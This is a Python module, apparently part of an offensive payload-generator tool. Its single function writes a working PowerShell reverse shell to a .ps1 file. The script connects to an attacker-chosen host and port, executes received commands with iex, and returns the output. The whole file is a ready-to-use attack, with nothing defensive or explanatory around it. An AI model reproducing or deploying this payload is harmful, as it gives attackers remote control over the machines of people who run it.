import os

from ..utils.consts import TOOL_INFORMATION, thePath


def powershell(lhost, port, name):
    print(lhost)
    value = str(
        """Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('"""
        + str(lhost)
        + """',"""
        + str(port)
        + """));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
    )
    if ".ps1" in name:
        open(name, "w").write(value)
    else:
        name = name + ".ps1"
        open(str(name), "w").write(value)

    path = os.path.join(os.getcwd(), name)
    if os.name == "posix":
        os.system("clear")

    elif os.name == "nt":
        os.system("cls")  #! unreachable
    print(TOOL_INFORMATION)
    print(thePath(path))
